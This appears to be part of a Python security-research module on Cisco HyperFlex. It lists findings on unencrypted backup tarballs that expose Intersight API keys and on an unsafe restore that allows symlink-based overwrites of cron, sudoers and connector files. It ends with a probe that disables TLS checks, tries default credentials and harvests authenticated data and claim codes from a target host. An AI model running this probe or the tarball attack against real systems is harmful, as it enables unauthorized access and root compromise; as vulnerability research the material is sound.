            "Replace Base64 with AES-GCM encryption using the StorvisorKeystore key (see HX-F41) "
            "for all credential fields before writing to temporary files or passing to deployment scripts. "
            "Write temporary credential files with mode 0600 (owner-only). "
            "Pass credentials via environment variables or a secure IPC channel instead of CLI arguments "
            "to avoid /proc/pid/cmdline exposure. "
            "Ensure cleanup runs in a finally block to guarantee deletion even on exception paths."
        ),
    },
    "HX-F91": {
        "title": (
            "connector_ctl backup Produces Unencrypted Tarball of connector.db "
            "Containing Intersight AccessKeyId and AccessKey — Planned Encryption Not Implemented"
        ),
        "severity": "HIGH",
        "cvss": "6.5",
        "cwe": "CWE-312",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl backup operation / "
            "connector.db SQLite database at <install-location>/db/connector.db"
        ),
        "class": "Cleartext Storage of Sensitive Information — Incomplete Security Control Implementation",
        "confirmed": True,
        "evidence": {
            "backup_command": (
                "connector_ctl backup <install-location> <target-dir>: "
                "Line 42: 'tar -czf $3/connector.tgz $2/db/connector.db'. "
                "Produces unencrypted gzip tarball of connector.db. "
                "Line 44: '# TODO - encrypt pkg' — encryption was planned but not implemented."
            ),
            "credential_scope": (
                "connector.db contains Intersight cloud management API credentials: "
                "AccessKeyId and AccessKey (Intersight API key pair). "
                "Confirmed by tech_support operation (line 23-24): "
                "'sed /AccessKeyId/d $3/connector.db > ... && sed /AccessKey/d $3/connector.db > ...' "
                "which explicitly strips these fields from tech-support output — "
                "confirming their presence and sensitivity."
            ),
            "contrast_with_tech_support": (
                "tech_support operation redacts AccessKeyId and AccessKey before copying. "
                "backup operation copies connector.db WITHOUT redaction or encryption. "
                "The asymmetry indicates the developer recognized credential sensitivity "
                "for tech-support bundles but left the backup path unprotected."
            ),
            "backup_location": (
                "Backup written to $3/connector.tgz where $3 is caller-supplied target directory. "
                "No access controls enforced on the output tarball."
            ),
        },
        "impact": (
            "Any user or process with read access to the backup target directory can extract "
            "connector.tgz and recover Intersight API credentials (AccessKeyId + AccessKey) in plaintext. "
            "Intersight API access enables full remote management plane control: "
            "cluster configuration, firmware upgrade orchestration, policy enforcement, "
            "and potentially pivoting to other Cisco-managed infrastructure registered with the same Intersight account. "
            "Backups are likely written to NFS-mounted shared storage (/nfs/SYSTEM/) accessible to all cluster nodes."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned encryption for backup tarballs — use AES-GCM with a key derived "
            "from the StorvisorKeystore (see HX-F41) or a cluster-unique backup key. "
            "As an interim measure, redact AccessKeyId and AccessKey from the backup using the same "
            "sed filtering already implemented for tech_support output. "
            "Set restrictive permissions (0600) on the output tarball. "
            "Remove the TODO comment and enforce the security control before release."
        ),
    },
    "HX-F92": {
        "title": (
            "connector_ctl restore Extracts Untrusted Tarball Directly to Filesystem Root "
            "with No Integrity Verification — Arbitrary File Write via Crafted Tarball"
        ),
        "severity": "HIGH",
        "cvss": "7.8",
        "cwe": "CWE-22",
        "component": (
            "hxdp Intersight Device Connector / connector_ctl restore operation / "
            "tar extraction to -C / (filesystem root)"
        ),
        "class": "Path Traversal via Unsafe Archive Extraction — Arbitrary File Write",
        "confirmed": True,
        "evidence": {
            "restore_command": (
                "connector_ctl restore <install-location> <source-config>: "
                "Line 62: 'tar xzf $3 -C /'. "
                "Extracts the caller-supplied tarball ($3) directly to the filesystem root (/). "
                "No integrity check (no signature, no HMAC, no hash comparison). "
                "No path sanitization of tarball entries before extraction."
            ),
            "no_decryption": (
                "Line 58: '# TODO - decrypt'. "
                "Decryption was planned but not implemented — confirming the TODO in backup/restore pair. "
                "Absence of decryption means any tarball is accepted regardless of origin."
            ),
            "path_traversal_vector": (
                "GNU tar with -C / extracts entries relative to /. "
                "Tarball entries with symlinks (e.g., 'db -> /etc/cron.d') redirect subsequent "
                "file writes to arbitrary filesystem paths. "
                "Absolute-path entries are stripped by default but symlink-based traversal "
                "(tar CVE-2007-4131 class) survives. "
                "Combined with lack of integrity check: attacker supplies crafted connector.tgz "
                "containing symlink entries to overwrite /etc/cron.d/*, /etc/sudoers.d/*, "
                "or connector binary at /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp."
            ),
            "unquoted_variable": (
                "Line 62: 'tar xzf $3 -C /' — $3 is unquoted. "
                "Path containing spaces or shell metacharacters causes unpredictable behavior or injection."
            ),
        },
        "impact": (
            "An attacker who can supply a crafted tarball to connector_ctl restore "
            "(via backup/restore Thrift RPC, NFS path manipulation, or post-initial-access file write) "
            "can write arbitrary files to the root filesystem. "
            "Overwriting /opt/partner/cisco-hxdc-run/hxdc_latest/hxdp replaces the connector binary "
            "executed by upstart — local root or persistent backdoor. "
            "Overwriting /etc/cron.d/ achieves code execution as root on next cron cycle. "
            "All cluster nodes run the same connector and may be vulnerable simultaneously."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Implement the planned decryption and add HMAC-SHA256 signature verification "
            "before tarball extraction. "
            "Validate all tarball entry paths against an allowlist (e.g., only "
            "./db/connector.db and no symlinks) before extraction. "
            "Quote all shell variables in connector_ctl to prevent word-splitting/globbing injection. "
            "Use tar --no-overwrite-dir --no-same-permissions and verify entry count matches expected."
        ),
    },
}


# ─── Probe Functions ──────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _hx_request(host: str, path: str, method: str = "GET",
                 token: Optional[str] = None, body: Optional[dict] = None,
                 timeout: int = 8) -> Optional[dict]:
    url = f"https://{host}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    if token:
        req.add_header("hx-auth-token", token)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code, "__reason": str(e.reason)}
    except Exception:
        return None


def probe_hx_connect(host: str, timeout: int = 8) -> dict:
    result = {
        "host": host, "port": HX_CONNECT_PORT, "reachable": False,
        "version": None, "unauth_data": {}, "cred_result": None,
        "auth_data": {}, "intersight_claim_code": None,
    }

    try:
        s = socket.create_connection((host, HX_CONNECT_PORT), timeout=timeout)
        s.close()
        result["reachable"] = True
    except Exception:
        return result

    for path in HX_UNAUTH_PATHS:
        data = _hx_request(host, path, timeout=timeout)
        if data and "__http_error" not in data:
            result["unauth_data"][path] = data
            if "version" in data or "hxVersion" in data:
                result["version"] = data.get("version") or data.get("hxVersion")

    token = None
    for user, passwd in HX_DEFAULT_CREDS:
        body = {"username": user, "password": passwd}
        resp = _hx_request(host, "/rest/v1/tokens", method="POST",
                           body=body, timeout=timeout)
        if resp and "token" in resp:
            token = resp["token"]
            result["cred_result"] = {"user": user, "pass": passwd}
            break
        if resp and "__http_error" in resp and resp["__http_error"] == 429:
            break

    if token:
        for key, path in HX_AUTH_PATHS.items():
            data = _hx_request(host, path, token=token, timeout=timeout)
            if data and "__http_error" not in data:
                result["auth_data"][key] = data

        conn = result["auth_data"].get("intersight_conn", {})
        result["intersight_claim_code"] = conn.get("claimCode") or conn.get("deviceId")

    return result


if __name__ == "__main__":
    import sys

    print("=== Cisco HyperFlex RE Module ===")
    print(f"Findings: {len(FINDINGS)} (HX-F01 through HX-F{max(int(k.split('-F')[1]) for k in FINDINGS)})")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print(json.dumps(probe_hx_connect(target), indent=2))
